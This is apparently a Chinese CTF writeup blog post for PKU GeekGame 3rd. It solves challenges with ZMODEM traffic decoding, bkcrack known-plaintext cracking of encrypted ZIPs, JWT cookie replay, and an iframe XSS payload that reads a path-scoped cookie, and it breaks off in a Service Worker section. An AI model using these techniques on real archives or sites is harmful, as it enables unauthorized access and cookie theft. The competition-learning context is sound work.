@@ -1,0 +1,1041 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/avatar.jog">
+  <link rel="icon" href="/img/avatar.jog">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="allons42">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="第三届北大CTF的解题报告，也搬运一下之前的">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PKU GeekGame 3rd Writeup">
+<meta property="og:url" content="https://allons42.github.io/geekgame_3rd/index.html">
+<meta property="og:site_name" content="Hitchhiker&#39;s camp">
+<meta property="og:description" content="第三届北大CTF的解题报告，也搬运一下之前的">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://allons42.github.io/img/geek3/scrore.png">
+<meta property="og:image" content="https://allons42.github.io/img/geek3/commit.png">
+<meta property="og:image" content="https://allons42.github.io/img/geek3/Google%20Lens.png">
+<meta property="og:image" content="https://allons42.github.io/img/geek3/ZMODEM.png">
+<meta property="og:image" content="https://allons42.github.io/img/geek3/ZMODEM_res1.jpg">
+<meta property="og:image" content="https://allons42.github.io/img/geek3/ZMODEM_res2.jpg">
+<meta property="og:image" content="https://allons42.github.io/img/geek3/zip.png">
+<meta property="og:image" content="https://allons42.github.io/img/geek3/map.png">
+<meta property="og:image" content="https://allons42.github.io/img/geek3/help.png">
+<meta property="og:image" content="https://allons42.github.io/img/geek3/claude.png">
+<meta property="og:image" content="https://allons42.github.io/img/geek3/route.png">
+<meta property="og:image" content="https://allons42.github.io/img/geek3/import.png">
+<meta property="og:image" content="https://allons42.github.io/img/geek3/clash1.png">
+<meta property="og:image" content="https://allons42.github.io/img/geek3/clash2.png">
+<meta property="og:image" content="https://allons42.github.io/img/geek3/CE.png">
+<meta property="og:image" content="https://allons42.github.io/img/geek3/tako.png">
+<meta property="article:published_time" content="2023-10-21T15:00:00.000Z">
+<meta property="article:modified_time" content="2024-05-28T07:41:42.797Z">
+<meta property="article:author" content="allons42">
+<meta property="article:tag" content="Tech">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://allons42.github.io/img/geek3/scrore.png">
+  
+  
+  
+  <title>PKU GeekGame 3rd Writeup - Hitchhiker&#39;s camp</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"allons42.github.io","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.2.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>allons42</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="PKU GeekGame 3rd Writeup"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-10-21 23:00" pubdate>
+          2023年10月21日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          7k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          59 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">PKU GeekGame 3rd Writeup</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>第三届北京大学信息安全综合能力竞赛（PKU
+GeekGame）的Writeup，题目及官方题解：<a
+target="_blank" rel="noopener" href="https://github.com/PKU-GeekGame/geekgame-3rd">geekgame-3rd</a>。</p>
+<figure>
+<img src="/img/geek3/scrore.png" srcset="/img/loading.gif" lazyload
+alt="差一点拿到二等奖，逆向真不会啊啊啊啊啊" />
+<figcaption
+aria-hidden="true">差一点拿到二等奖，逆向真不会啊啊啊啊啊</figcaption>
+</figure>
+<h2 id="一眼盯帧">一眼盯帧</h2>
+<p>显然是要逐帧把字母拼起来，随便搜了个<a
+target="_blank" rel="noopener" href="https://uutool.cn/gif2img/">在线工具</a>拆分图片，可以读出<code>synt&#123;jrypbzrgbtrrxtnzr&#125;</code>。两个大括号保留了flag的特征，对字母做ROT13变换得到flag。</p>
+<h2 id="小北问答">小北问答</h2>
+<p><strong>最爱的每年保留环节！</strong></p>
+<blockquote>
+<p>#1
+在北京大学（校级）高性能计算平台中，什么命令可以提交一个非交互式任务？</p>
+</blockquote>
+<p>北极星<a
+target="_blank" rel="noopener" href="https://hpc.pku.edu.cn/_book/guide/slurm/slurm.html">官方教程</a>里找到答案：sbatch。</p>
+<blockquote>
+<p>#2 根据 GPL 许可证的要求，基于 Linux
+二次开发的操作系统内核必须开源。例如小米公司开源了 Redmi K60 Ultra
+手机的内核。其内核版本号是？</p>
+</blockquote>
+<p>很容易查到这款手机的内核是Android 13，以及GitHub上的<a
+target="_blank" rel="noopener" href="https://github.com/MiCode/Xiaomi_Kernel_OpenSource/tree/corot-t-oss">开源代码</a>，commits里有几条关于Android版本号的很显眼：</p>
+<p><img src="/img/geek3/commit.png" srcset="/img/loading.gif" lazyload /></p>
+<p>在这次更新内容里搜索version，发现关键的信息存储在Makefile里，查看最新的<a
+target="_blank" rel="noopener" href="https://github.com/MiCode/Xiaomi_Kernel_OpenSource/blob/corot-t-oss/Makefile">Makefile</a>找到版本号。顺便吐槽GitHub上非常规文本类型的文件不能直接检索好麻烦……</p>
+<blockquote>
+<p>#3 每款苹果产品都有一个内部的识别名称（Identifier），例如初代 iPhone
+是 <code>iPhone1,1</code>。那么 Apple Watch Series 8（蜂窝版本，41mm
+尺寸）是什么？</p>
+</blockquote>
+<p>直接Google，找到外媒<a
+href="(https://everymac.com/systems/apple/apple-watch/specs/apple-watch-series-8-gps-cellular-41mm-china-hong-kong-macau-a2857.html)">GSMArena</a>的网站上有各种电子设备的型号参数，但是大小写不对。<a
+target="_blank" rel="noopener" href="https://everymac.com/systems/apple/apple-watch/specs/apple-watch-series-8-gps-cellular-41mm-china-hong-kong-macau-a2857.html">EveryMac</a>网站上有更准确详细的信息。</p>
+<p>PS：写writeup的时候才发现Google <code>“iPhone1,1”</code> <a
+target="_blank" rel="noopener" href="https://gist.github.com/adamawolf/3048717">第一条</a>就有全部Apple移动设备的编号。</p>
+<blockquote>
+<p>#4 本届 PKU GeekGame
+的比赛平台会禁止选手昵称中包含某些特殊字符。截止到 2023 年 10 月 1
+日，共禁止了多少个字符？（提示：本题答案与 Python
+版本有关，以平台实际运行情况为准）</p>
+</blockquote>
+<p>查阅平台后端的开源代码，检索user_name,
+forbidden都没查到，最后用name定位到了<a
+target="_blank" rel="noopener" href="https://github.com/PKU-GeekGame/gs-backend/blob/2a1b6743559b95a534e186c4e170eab6b8de5400/src/store/user_profile_store.py#L64">关键文件</a>，发现变量名是nickname和disallowed，实在是电波没对上。</p>
+<p>![]/(img/geek3/char.png)</p>
+<p>这段代码拿到python上跑一下就可以得到结果，刚好是python3.8的版本，没遇到奇奇怪怪的问题。</p>
+<blockquote>
+<p>#5 在 2011 年 1 月，Bilibili
+游戏区下共有哪些子分区？（按网站显示顺序，以半角逗号分隔）</p>
+</blockquote>
+<p><a target="_blank" rel="noopener" href="https://archive.org/web/">Wayback
+Machine</a>，启动！可惜直接检索bilibili.com找到的少数档案都打不开了。在b站找到个视频：<a
+target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1Xx411R7VP/">用时光机网站去看以前的b站网页</a>，评论区提到b站曾用的域名包括mikufans.cn，bilibili.us，bilibili.tv，思路打开，果然找到了2011年的存档：<a
+target="_blank" rel="noopener" href="https://web.archive.org/web/20110102140319/http://bilibili.us/video/game.html">游戏_嗶哩嗶哩
+(archive.org)</a>。</p>
+<blockquote>
+<p>#6
+这个照片中出现了一个大型建筑物，它的官方网站的域名是什么？（照片中部分信息已被有意遮挡，请注意检查答案格式）</p>
+</blockquote>
+<p>这题很神秘，一开始按赞助商的文字信息检索到了iasp2019，图标背面也对上了，但是误以为目标是iasp的官网卡了好久。后来用无敌的⭐<strong>Google</strong>⭐<strong>Lens</strong>⭐试了一下没想到直接试出来了……卢森堡音乐厅建筑形状吻合，查了一下<a
+target="_blank" rel="noopener" href="http://www.iaspbo.com.cn/contents/2/533">iasp2023</a>也确实是在卢森堡办的，确认无误。</p>
+<p><img src="/img/geek3/Google%20Lens.png" srcset="/img/loading.gif" lazyload /></p>
+<h2 id="z-公司的服务器">Z 公司的服务器</h2>
+<p><a
+target="_blank" rel="noopener" href="https://github.com/allons42/CTF-Writeup/blob/main/PKUgeekgame-3rd/codes/zmodem.ipynb">code</a></p>
+<h3 id="flag1">flag1</h3>
+<p>网页终端打开有乱码，但是用代码接收到的数据是<code>rz\r**\x18B00000000000000\r\x8a\x11</code>，结合题目描述，很容易猜到考点是sz/rz命令。题目要求直接用这种方法接受flag1，打开WireShark，筛选出客户端发送的数据，原样发送到服务器即可收到flag。</p>
+<figure>
+<img src="/img/geek3/ZMODEM.png" srcset="/img/loading.gif" lazyload alt="ZMODEM" />
+<figcaption aria-hidden="true">ZMODEM</figcaption>
+</figure>
+<h3 id="flag2">flag2</h3>
+<p>题目要求是从给出的流量包中提取数据。查到rz命令所属的协议叫ZMODEM，而数据流的开头给出了传输的文件名flag.jpg，所以就是从数据流中提取一个jpg文件。从WireShark导出相应的TCP流，根据jpg格式把<code>FF D8</code>到<code>FF D9</code>的数据直接复制出来，但是这样生成的文件无法读取，还是得仔细检查<a
+target="_blank" rel="noopener" href="http://wiki.synchro.net/ref:zmodem">协议规范</a>。查到一篇<a
+target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/579720546">实现概述</a>提到了非常简洁的处理方式：</p>
+<blockquote>
+<p>接收相对简单，在需要解转义的数据段，只要遇到ZDLE，输出其后续字节的值异或0x40</p>
+</blockquote>
+<p>简单做了转义处理后，得到一张非常模糊的图片，说明解码还是存在问题。</p>
+<p><img src="/img/geek3/ZMODEM_res1.jpg" srcset="/img/loading.gif" lazyload /></p>
+<p>仔细阅读文档，发现文件头包括了传输文件的大小，字节数都没对上，<del>但是居然还能读出来图片</del>。查<a
+target="_blank" rel="noopener" href="https://blog.csdn.net/alpbrook/article/details/123275755">资料</a>发现ZMODEM将数据按1024字节分块，每块结尾还有两个<code>ZDLE</code>和4字节CRC校验码。对上述数据加入了每1024字节跳过6字节的处理，解码出的图片仍然不清晰，但是可以强行读出flag，就没有再精调。</p>
+<p><img src="/img/geek3/ZMODEM_res2.jpg" srcset="/img/loading.gif" lazyload /></p>
+<h2 id="基本功">基本功</h2>
+<p><strong>学到了好玩的东西！</strong>之前只是模糊地知道加密压缩包可以明文攻击，没想到需要的明文这么少。</p>
+<h3 id="flag1-1">flag1</h3>
+<p>flag1的压缩包中包括<code>chromedriver_linux64.zip</code>和<code>flag1.txt</code>，很容易想到是明文攻击，那么就要找到这个chromedriver的源文件。在<a
+target="_blank" rel="noopener" href="https://chromedriver.chromium.org/downloads">官网</a>上可以找到所有历史版本，但是前几个的大小都对不上。在Google上强行搜索<code>chromedriver "5845152"</code>找到<a
+target="_blank" rel="noopener" href="https://chromedriver.storage.googleapis.com/">文档树</a>，发现对应的版本号应该是<a
+target="_blank" rel="noopener" href="https://chromedriver.storage.googleapis.com/index.html?path=89.0.4389.23/">89.0.4389.23</a>，大小和CRC都完全一致。拿到明文文件后，查到了ARCHPR这个工具，运行了一晚上才破解出来。</p>
+<p><img src="/img/geek3/zip.png" srcset="/img/loading.gif" lazyload /></p>
+<h3 id="flag2-1">flag2</h3>
+<p>另一篇<a
+target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/255145.html">博客</a>介绍了<a
+target="_blank" rel="noopener" href="https://github.com/kimci86/bkcrack">bkcrack</a>这个工具，只需要已知位置的12个字节即可进行破解，由于flag2中的<a
+target="_blank" rel="noopener" href="https://pcapng.com/">pcapng</a>文件有固定的文件头，可以仿照博客中的方法实现明文攻击：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 把pcapng文件头中固定的12字节写入文件</span><br>$ <span class="hljs-built_in">echo</span> 4d3c2b1a01000000ffffffffffffffff | xxd -r -ps &gt; pcapng_header<br><br><span class="hljs-comment"># 偏移量为8，根据已经字节进行明文攻击</span><br>$ bkcrack -C challenge_2.zip -c flag2.pcapng -p pcapng_header -o 8 &gt;<span class="hljs-built_in">log</span><br><br><span class="hljs-comment"># 破解出三个密钥为e555cb61 6f865f31 ecb9e966，解压缩目标文件</span><br>$ bkcrack -C challenge_2.zip -c flag2.pcapng -k e555cb61 6f865f31 ecb9e966 -d flag2.pcapng<br></code></pre></td></tr></table></figure>
+<p>破解这个压缩包只用了10秒！解出的pcapng文件直接丢进WinHex里字符查找即可得到flag。</p>
+<h2 id="dark-room">Dark Room</h2>
+<p><a
+target="_blank" rel="noopener" href="https://github.com/allons42/CTF-Writeup/blob/main/PKUgeekgame-3rd/codes/room-flag1.ipynb">code1</a>
+<a
+target="_blank" rel="noopener" href="https://github.com/allons42/CTF-Writeup/blob/main/PKUgeekgame-3rd/codes/room-flag2.ipynb">code2</a></p>
+<p><del>好玩，爱玩，多出点</del></p>
+<h3 id="flag1-2">flag1</h3>
+<p>手玩几轮可以发现内容是固定的，再看<a
+target="_blank" rel="noopener" href="https://github.com/tinichu316/Dark_Room/blob/master/resources/map.txt">源码</a>发现地图都给出来了，大概长这样：</p>
+<p><img src="/img/geek3/map.png" srcset="/img/loading.gif" lazyload /></p>
+<p>总之经历了一些尝试之后，顺利拿到两把钥匙走出大门，得到的提示是保持san值在117以上才能拿到flag。尝试几轮之后最优的通关状态是比初始值少11点，所以出门时至少要有128点san值。经过尝试，help选项有概率回复san值，看源码可以确认是20%概率回复10点（同时由于进行一次行动还要扣除一点），所以只要欧皇四连抽全中就可以拿到
+<del>SSR</del> flag了！开个脚本慢慢跑就搞定了。</p>
+<p><img src="/img/geek3/help.png" srcset="/img/loading.gif" lazyload /></p>
+<h3 id="flag2-2">flag2</h3>
+<p>手玩的时候发现Locked_Door2下方比原始地图多了一个房间，可以猜数字，猜错数字没有任何提示，乱输一串字符则会出现报错，泄露出一段源码。这里最后一行不是
+<code>&gt;&gt;=</code>
+就很莫名其妙，也没有试出来其他部分代码的报错，一阶段卡在这里了。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">while</span> flag_number:<br>    choice = <span class="hljs-built_in">int</span>(self.recv(<span class="hljs-string">b&quot;Guess my public key (give me a number): &quot;</span>).decode())<br>    <span class="hljs-keyword">if</span> flag_number &amp; <span class="hljs-number">1</span>:<br>        p = getStrongPrime(<span class="hljs-number">2048</span>)<br>        q = getStrongPrime(<span class="hljs-number">2048</span>)<br>    flag_number &gt;&gt; <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
+<p>二阶段看到提示是注意报错信息，感觉之前没有走偏路，于是尝试在本地运行上面的代码，发现求一次大素数就要好几秒。又尝试玩了几轮，发现猜数字的回复速度有明显的快慢差异，这时就大概猜到了应该是将flag_number的二进制位反映在了回复时间上。用脚本统计了几轮，发现每轮都是刚好343次回复后终止，且生成的二进制数据都一样。这里以为要把解出来的数字交上去作为答案，但是怎么猜都不对，睡了一觉突然意识到这个长度相当于大约40个字符左右的字符串，直接读出来就是flag本身。</p>
+<p>PS：事后一想，输出的报错信息压根不符合python常规的报错格式，回复时间又非常集中的出现在0s和1s附近，所以这段信息是伪装成报错的提示，其实压根不存在一个可以被猜出来的数字吧
+(╯°Д°)╯︵ ┻━┻</p>
+<h2 id="emoji-wordle">Emoji Wordle</h2>
+<p><a
+target="_blank" rel="noopener" href="https://github.com/allons42/CTF-Writeup/blob/main/PKUgeekgame-3rd/codes/wordle.ipynb">code</a></p>
+<h3 id="flag1-3">flag1</h3>
+<p>既然都说了Level
+1答案固定，就直接写脚本开猜。最优方案应该先试出来答案包括哪些emoji，再枚举排列方案，但是由于网页上直接提供了随机的答案候选，这里就偷懒不去重新生成高效的猜测，而是直接检查随机猜测里哪些是完全正确的，事实上复杂度还挺低的，不需要优化算法就出结果了。</p>
+<h3 id="flag2-3">flag2</h3>
+<p>web题首先肯定是检查源码和cookie，看到了熟悉的三段Base64编码的JWT，这么长的数据一看就有东西。直接丢进随便找的在线Base64解码器没解出来（应该是因为里面有emoji），还是<a
+target="_blank" rel="noopener" href="https://jwt.io/">官网</a>靠谱，直接读出答案。</p>
+<p>![]/(img/geek3/jwt.png)</p>
+<h3 id="flag3">flag3</h3>
+<p>Level
+3的cookie还是JWT，存储的数据变成了随机种子、剩余次数和时间戳。虽然不能直接读出答案，但猜到答案应该是通过随机种子生成的，可以验证一下：在Level
+3中读出下面这样的cookie，并进行一次随机猜测；重新进入关卡，把cookie粘贴到新关卡里，重复上一轮的猜测，发现结果不变，且更新后的cookie剩余次数仍为2。</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;data&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;level&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;3&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;start_time&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;1697828222492&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;remaining_guesses&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;3&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;seed&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;1.1205598603931663E12&quot;</span><br>  <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;nbf&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1697828232</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;iat&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1697828232</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>
+<p>这样解法就确定了，首先刷新关卡，得到一个剩余3次猜测的cookie，然后用这个cookie重复Level
+1的穷举策略，即可得到正确答案。</p>
+<h2 id="第三新xss">第三新XSS</h2>
+<h3 id="flag1-4">flag1</h3>
+<p>题目要求对同一个域名的网站进行XSS攻击，题目给的自由度很大，允许在主域名下建立任何类型的网页。审计源码发现，正常情况下应该是共享cookie的，唯一的阻碍是受害者给cookie加入了path参数。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span> = <span class="hljs-string">&quot;flag=&#123;...&#125;; path=/admin&quot;</span><br></code></pre></td></tr></table></figure>
+<p>遇事不决先查文档，<a
+target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/API/Document/cookie#%E5%AE%89%E5%85%A8">文档</a>说路径限制并不能阻止从其他路径访问cookie，同源策略不会保护相同域名的网站，甚至还教了做法，可以用iframe访问其<code>contentDocument.cookie</code>属性。先写了一段测试代码，成功弹出目标网站的信息：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;xss&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;../admin&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-keyword">var</span> iframe = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;xss&quot;</span>);</span><br><span class="language-javascript"><span class="hljs-title function_">alert</span>(iframe);</span><br><span class="language-javascript"><span class="hljs-keyword">var</span> iframeDoc = iframe.<span class="hljs-property">contentDocument</span>;</span><br><span class="language-javascript"><span class="hljs-title function_">alert</span>(iframeDoc);</span><br><span class="language-javascript"><span class="hljs-variable language_">document</span>.<span class="hljs-property">title</span> = iframeDoc.<span class="hljs-property">cookie</span>;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
+<p>看起来是搞定了，删掉alert准备上传，结果……并没有拿到flag？？继续调试，发现居然是alert的问题，一旦删掉alert就会失效。请教一下万能的大模型：</p>
+<p><img src="/img/geek3/claude.png" srcset="/img/loading.gif" lazyload /></p>
+<p><strong>优！雅！</strong>在Claude的帮助下重写代码拿到flag。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;xss&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;../admin&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-keyword">var</span> iframe = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;xss&quot;</span>);</span><br><span class="language-javascript">iframe.<span class="hljs-property">onload</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">  <span class="hljs-keyword">var</span> doc = iframe.<span class="hljs-property">contentDocument</span>; </span><br><span class="language-javascript">  <span class="hljs-variable language_">document</span>.<span class="hljs-property">title</span> = doc.<span class="hljs-property">cookie</span>;</span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
+<h3 id="flag2-4">flag2</h3>
+<p>学习<a
+target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/API/Service_Worker_API/Using_Service_Workers">Service
+Worker</a>，这是一种网页缓存机制，可以用于<a
+target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1745908">持久化XSS攻击</a>，但是有很多安全限制：</p>
+<blockquote>
+<p>1、只能注册同源下的js</p>
+<p>2、站内必须支持Secure
+Context，也就是站内必须是<code>https://</code>或者<code>http://localhost/</code></p>
+<p>3、Content-Type必须是js</p>
+<ul>
+<li><p>text/javascript</p></li>
+<li><p>application/x-javascript</p></li>
+<li><p>application/javascript</p></li>
+</ul>
+<p>4、必须用站内脚本注册，且作用域（Scope）必须是在脚本目录之下</p>
+</blockquote>
+<p>前三条都很好满足，问题是怎么将SW注册到 <code>"/"</code> 这个 scope
+上。正常创建的脚本只能保存到 <code>"/sw/"</code>
+，如果去掉最后的斜杠会被chrome报错：<code>Failed to registration a ServiceWorker. The script resource is behind a redirect, which is disallowed.</code></p>
